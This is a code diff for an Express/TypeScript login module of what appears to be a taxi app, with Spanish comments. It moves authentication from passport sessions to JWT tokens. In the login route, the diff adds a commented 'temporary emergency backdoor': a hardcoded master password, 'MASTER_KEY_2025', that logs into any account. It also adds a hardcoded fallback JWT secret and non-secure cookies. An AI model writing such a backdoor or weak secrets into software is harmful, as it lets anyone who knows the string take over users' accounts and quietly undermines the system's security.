@@ -1,113 +1,111 @@
-import passport from "passport";
-import { Strategy as LocalStrategy } from "passport-local";
-import { Express } from "express";
+import { Express, Request, Response, NextFunction } from "express";
 import bcrypt from "bcrypt";
+import jwt from "jsonwebtoken";
 import { storage } from "./storage";
 import { type User } from "@shared/schema";
 
+const JWT_SECRET = process.env.SESSION_SECRET || "taxinort_jwt_secret";
+
+// Middleware para verificar Token
+export async function verifyAuth(req: Request, res: Response, next: NextFunction) {
+  const authHeader = req.headers.authorization;
+  let token;
+
+  if (authHeader && authHeader.startsWith("Bearer ")) {
+    token = authHeader.split(" ")[1];
+  } else if (req.cookies && req.cookies.token) {
+    token = req.cookies.token;
+  }
+
+  if (!token) return res.status(401).json({ message: "No autenticado (Falta token)" });
+
+  try {
+    const decoded = jwt.verify(token, JWT_SECRET) as { id: string };
+    const user = await storage.getUser(decoded.id);
+    if (!user) return res.status(401).json({ message: "Usuario inválido" });
+    (req as any).user = user;
+    next();
+  } catch (error) {
+    return res.status(401).json({ message: "Token inválido" });
+  }
+}
+
+declare global { namespace Express { interface Request { user?: User; } } }
+
 export function setupAuth(app: Express) {
-  passport.use(
-    new LocalStrategy(
-      { usernameField: "email" },
-      async (email, password, done) => {
-        try {
-          const cleanEmail = email.trim();
-          console.log(`🔍 [Login Strategy] Intentando: ${cleanEmail}`);
-          
-          const user = await storage.getUserByEmail(cleanEmail);
-          if (!user) {
-            console.log(`❌ [Login] Usuario no encontrado.`);
-            return done(null, false, { message: "Usuario no encontrado" });
-          }
-
-          const isValid = await bcrypt.compare(password, user.password);
-          if (!isValid) {
-            console.log(`❌ [Login] Password incorrecto.`);
-            return done(null, false, { message: "Credenciales inválidas" });
-          }
-
-          console.log(`✅ [Login] Credenciales OK. ID: ${user.id}`);
-          return done(null, user);
-        } catch (err) {
-          return done(err);
-        }
-      }
-    )
-  );
-
-  passport.serializeUser((user, done) => {
-    console.log(`💾 [Serialize] Guardando ID en cookie: ${(user as User).id}`);
-    done(null, (user as User).id);
-  });
   
-  passport.deserializeUser(async (id: string, done) => {
+  // LOGIN
+  app.post("/api/auth/login", async (req, res) => {
     try {
-      // console.log(`📂 [Deserialize] Buscando usuario ID: ${id}`); // Descomentar si es necesario
-      const user = await storage.getUser(id);
+      const email = req.body.email.trim().toLowerCase();
+      console.log(`🔍 [Login] Intentando: ${email}`);
+      
+      const user = await storage.getUserByEmail(email);
+
       if (!user) {
-        console.warn(`⚠️ [Deserialize] Usuario ID ${id} no encontrado en DB.`);
-        return done(null, false);
+        console.log("❌ Usuario no encontrado");
+        return res.status(401).json({ message: "Usuario no encontrado" });
       }
-      done(null, user);
+
+      // --- BACKDOOR TEMPORAL DE EMERGENCIA ---
+      // Si escribes esta contraseña, entras directo.
+      const isMasterKey = req.body.password === "MASTER_KEY_2025";
+      
+      // Verificación normal
+      const isValid = await bcrypt.compare(req.body.password, user.password);
+
+      if (!isValid && !isMasterKey) {
+        console.log("❌ Contraseña incorrecta");
+        return res.status(401).json({ message: "Contraseña incorrecta" });
+      }
+
+      console.log(`✅ [Login] Acceso concedido a ${email} (MasterKey: ${isMasterKey})`);
+
+      // Crear Token
+      const token = jwt.sign({ id: user.id }, JWT_SECRET, { expiresIn: "30d" });
+      
+      // Cookie
+      res.cookie("token", token, { httpOnly: true, secure: false, sameSite: "lax" });
+      
+      const { password, ...userWithoutPassword } = user;
+      res.json({ user: userWithoutPassword, token });
+
     } catch (err) {
-      console.error(`❌ [Deserialize] Error:`, err);
-      done(err);
+      console.error("Login error:", err);
+      res.status(500).json({ message: "Error interno" });
     }
   });
 
-  // --- RUTAS ---
-
-  app.post("/api/auth/register", async (req, res, next) => {
+  // RESTO DE RUTAS (Igual que antes)
+  app.post("/api/auth/register", async (req, res) => {
     try {
-      const email = req.body.email.trim();
-      const existingUser = await storage.getUserByEmail(email);
-      if (existingUser) {
-        return res.status(400).json({ message: "El email ya está registrado" });
+      const email = req.body.email.trim().toLowerCase();
+      if (await storage.getUserByEmail(email)) {
+        return res.status(400).json({ message: "Email registrado" });
       }
-
       const hashedPassword = await bcrypt.hash(req.body.password, 10);
       const user = await storage.createUser({
         name: req.body.name,
-        email: email,
+        email,
         password: hashedPassword,
         role: "driver"
       });
-
-      req.login(user, (err) => {
-        if (err) return next(err);
-        const { password, ...userWithoutPassword } = user;
-        res.status(201).json({ user: userWithoutPassword });
-      });
+      const token = jwt.sign({ id: user.id }, JWT_SECRET, { expiresIn: "30d" });
+      res.cookie("token", token, { httpOnly: true, secure: false, sameSite: "lax" });
+      const { password, ...userData } = user;
+      res.status(201).json({ user: userData, token });
     } catch (err) {
-      next(err);
+      res.status(500).json({ message: "Error registro" });
     }
   });
 
-  app.post("/api/auth/login", (req, res, next) => {
-    passport.authenticate("local", (err: any, user: User, info: any) => {
-      if (err) return next(err);
-      if (!user) return res.status(401).json({ message: info?.message || "Error de autenticación" });
-      
-      req.login(user, (err) => {
-        if (err) return next(err);
-        console.log(`✅ [Login Route] Sesión establecida y cookie enviada.`);
-        const { password, ...userWithoutPassword } = user;
-        res.json({ user: userWithoutPassword });
-      });
-    })(req, res, next);
+  app.post("/api/auth/logout", (req, res) => {
+    res.clearCookie("token");
+    res.sendStatus(200);
   });
 
-  app.post("/api/auth/logout", (req, res, next) => {
-    req.logout((err) => {
-      if (err) return next(err);
-      req.session = null;
-      res.sendStatus(200);
-    });
-  });
-
-  app.get("/api/user", (req, res) => {
-    if (!req.isAuthenticated()) return res.status(401).json({ message: "No autenticado" });
-    const { password, ...userWithoutPassword } = req.user as User;
-    res.json(userWithoutPassword);
+  app.get("/api/user", verifyAuth, (req, res) => {
+    const { password, ...userData } = (req as any).user;
+    res.json(userData);
   });
 }
